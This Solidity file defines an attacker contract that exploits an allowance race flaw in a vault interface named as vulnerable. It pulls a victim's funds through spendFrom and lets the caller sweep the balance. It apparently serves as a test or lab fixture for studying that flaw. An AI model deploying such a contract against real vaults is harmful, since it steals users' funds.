// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableAllowanceVault {
    function spendFrom(address owner, address payable recipient, uint256 amount) external;
}

contract AllowanceRaceAttacker {
    function spendOnce(address vault, address victim, uint256 amount) external {
        IVulnerableAllowanceVault(vault).spendFrom(victim, payable(address(this)), amount);
    }

    function sweep() external {
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "PAYOUT_FAILED");
    }

    receive() external payable {}
}